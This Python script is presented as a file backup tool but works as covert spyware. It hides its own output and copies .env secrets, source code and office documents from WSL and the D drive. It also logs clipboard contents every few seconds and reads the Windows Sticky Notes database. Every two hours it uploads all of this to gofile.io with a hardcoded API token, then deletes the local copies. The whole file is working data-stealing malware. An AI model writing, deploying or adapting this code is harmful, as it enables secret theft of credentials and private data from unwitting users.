import os
import shutil
import time
import subprocess
import requests
from datetime import datetime
import threading
import getpass
import logging
import sys

sys.stdout = sys.stderr = open(os.devnull, 'w')

logging.basicConfig(level=logging.CRITICAL, format="%(message)s")

def get_windows_username():
    try:
        result = subprocess.run(
            ["powershell.exe", "-Command", "[System.Environment]::UserName"],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception as e:
        logging.error(f"Error retrieving Windows username: {e}")
    return os.environ.get("USERNAME", getpass.getuser())

def backup_files(source_dir, target_dir, file_extensions):
    source_dir = os.path.abspath(os.path.expanduser(source_dir))
    target_dir = os.path.abspath(os.path.expanduser(target_dir))

    if os.path.exists(target_dir):
        shutil.rmtree(target_dir)
    
    os.makedirs(target_dir, exist_ok=True)

    for root, _, files in os.walk(source_dir):

        if os.path.abspath(root).startswith(target_dir):
            continue

        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):  
                source_file = os.path.join(root, file)
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_dir, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                os.makedirs(target_sub_dir, exist_ok=True)
                try:
                    shutil.copy2(source_file, target_file)
                except Exception as e:
                    logging.error(f"Failed to copy {source_file}: {e}")

    return target_dir

def zip_backup_folder(folder_path, zip_file_path):
    try:
        if os.path.exists(f"{zip_file_path}.zip"):
            os.remove(f"{zip_file_path}.zip")
        
        shutil.make_archive(zip_file_path, 'zip', folder_path)
        
        shutil.rmtree(folder_path)

        return f"{zip_file_path}.zip"
    except Exception as e:
        logging.error(f"Failed to zip folder {folder_path}: {e}")
        return None

def is_valid_file(file_path):
    try:
        if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
            return False
        with open(file_path, "rb"):
            pass
        return True
    except Exception:
        return False

def upload_file(file_path, api_token):
    if is_valid_file(file_path):
        try:
            with open(file_path, "rb") as f:
                response = requests.post(
                    "https://store9.gofile.io/uploadFile",
                    files={"file": f},
                    data={"token": api_token}
                )

                if response.status_code == 200:
                    logging.critical(f"Uploaded successfully: {file_path}")

                    os.remove(file_path)
                else:
                    logging.error(f"Failed to upload {file_path}. Status code: {response.status_code}, Response: {response.text}")
        except Exception as e:
            logging.error(f"Error uploading file {file_path}: {e}")
    else:
        logging.error(f"File {file_path} is empty or invalid, skipping upload.")

def get_clipboard_content():
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception as e:
        logging.error(f"Error accessing clipboard: {e}")
        return None

def log_clipboard_update(content, file_path):
    try:
        with open(file_path, 'a') as f:
            f.write(f"Time: {datetime.now()}\n{content}\n\n")
    except Exception as e:
        logging.error(f"Failed to log clipboard content: {e}")

def monitor_clipboard(file_path):
    last_content = ""
    while True:
        current_content = get_clipboard_content()
        if current_content and current_content != last_content:
            log_clipboard_update(current_content, file_path)
            last_content = current_content
        time.sleep(3)

def periodic_backup_upload():
    windows_user = get_windows_username()

    wsl_backup_directory = "~/.dev/Backup/wsl"
    ddd_backup_directory = "~/.dev/Backup/ddd"
    ddd_source_directory = "/mnt/d"
    clipboard_log_path = os.path.expanduser("~/.dev/Backup/clipboard_log.txt")
    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    api_token = "z7hjnq2voZ7tDyh7VHBKeIf0B6k1CuXC"

    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()

    os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
    open(clipboard_log_path, 'a').close()

    while True:
        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".js", ".py", ".go", ".txt"])

        ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".json", ".js", ".py", ".go", ".csv"])

        wsl_zip_file_path = os.path.expanduser("~/.dev/Backup/wsl_backup")
        wsl_zip_file = zip_backup_folder(wsl_backup_dir, wsl_zip_file_path)

        ddd_zip_file_path = os.path.expanduser("~/.dev/Backup/ddd_backup")
        ddd_zip_file = zip_backup_folder(ddd_backup_dir, ddd_zip_file_path)

        if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
            upload_file(clipboard_log_path, api_token)

        if os.path.exists(sticky_notes_path):
            upload_file(sticky_notes_path, api_token)

        if wsl_zip_file:
            upload_file(wsl_zip_file, api_token)

        if ddd_zip_file:
            upload_file(ddd_zip_file, api_token)

        time.sleep(7200)

if __name__ == '__main__':
    periodic_backup_upload()
